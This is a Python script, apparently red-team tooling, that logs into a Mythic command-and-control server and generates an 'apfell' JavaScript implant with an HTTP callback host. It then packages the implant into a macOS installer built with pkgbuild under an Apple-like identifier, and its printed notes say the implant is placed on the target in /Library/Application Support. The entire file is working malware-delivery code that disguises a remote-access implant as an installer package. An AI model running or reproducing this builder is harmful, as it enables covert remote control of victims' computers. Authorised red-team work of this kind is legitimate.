import shutil, errno, os
from mythic import *
from sys import exit
from os import system
from Settings.MythicSettings import *

def install_pkg_with_LD():
    temp = "./Templates/Installer_Package_with_LD"
    payload = "./Payloads/Installer_Package_with_LD_Payload"    

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = Payload(
            # what payload type is it
            payload_type="apfell", 
            c2_profiles={
                "HTTP":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            # give our payload a description if we want
            tag="Installer Pkg with LD",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            # what do we want the payload to be called
            filename="Install_LD.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
        print("[*] Downloading apfell payload")
        
        payloadDownloadid = resp.response.file_id.agent_file_id 

        payload_contents = await mythic.download_payload(resp.response)
        pkg_payload = payload + "/simple-package/scripts/files/SimpleStarter.js"
        with open(pkg_payload, "wb") as f:
            f.write(payload_contents)  

        #  Build the payload (currently no payload)
        print("[*] Building Installer Package with LD Payload")
        os.system("chmod +x ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts/preinstall")
        os.system("chmod +x ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts/postinstall")
        os.system("pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts ./Payloads/Installer_Package_with_LD_Payload/simple_LD.pkg")

        # To add payload :
             #--root (optional): The path to the root directory for the installer payload.​
        print("[+] Built simple_LD.pkg")
        print("Notes: \n"
              "1) This version saves the apfell payload on target as /Library/Application Support/SimpleStarter.js \n"
              "2) Modify the com.simple.plist and SimpleStarter.js to change this behavior")
 

    async def main():
        await scripting()
        try:
            while True:
                pending = asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
